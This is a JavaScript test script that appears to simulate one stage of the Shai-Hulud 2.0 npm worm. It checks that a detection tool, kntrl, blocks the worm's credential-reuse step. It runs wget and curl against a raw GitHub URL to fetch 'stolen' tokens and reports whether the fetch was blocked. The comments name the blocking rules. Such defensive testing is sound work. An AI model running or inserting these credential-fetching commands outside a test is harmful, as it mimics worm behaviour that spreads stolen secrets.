/**
 * Stage 5 — Fetch stolen credentials from raw.githubusercontent.com
 *
 * Shai-Hulud 2.0 added a credential reuse feature: the worm fetches
 * previously exfiltrated tokens from public GitHub repos created by
 * earlier victims. This provides a fallback when direct exfil fails.
 *
 * kntrl detection:
 *   - Rego rule 3: blocks npm/node children from raw.githubusercontent.com
 *   - YAML blocked_chains: blocks wget from npm ancestry
 */

const { execSync } = require("child_process");

console.log("  [github-raw] Attempting to fetch stolen creds from raw GitHub ...");
try {
  execSync(
    `wget -q -O- --timeout=5 https://raw.githubusercontent.com/test-exfil-store/main/tokens.txt`,
    { stdio: "inherit", timeout: 8000 }
  );
  console.log("  [github-raw] WARNING: raw.githubusercontent.com fetch succeeded (should be blocked!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [github-raw] wget killed by kntrl (SIGKILL) — process chain block");
  } else {
    console.log("  [github-raw] wget to raw.githubusercontent.com blocked — expected");
  }
}

// Also try with curl (worm tries multiple tools)
console.log("  [github-raw] Attempting with curl fallback ...");
try {
  execSync(
    `curl -s -m 5 https://raw.githubusercontent.com/test-exfil-store/main/tokens.txt`,
    { stdio: "inherit", timeout: 8000 }
  );
  console.log("  [github-raw] WARNING: curl to raw.githubusercontent.com succeeded (should be blocked!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [github-raw] curl killed by kntrl (SIGKILL)");
  } else {
    console.log("  [github-raw] curl to raw.githubusercontent.com blocked — expected");
  }
}
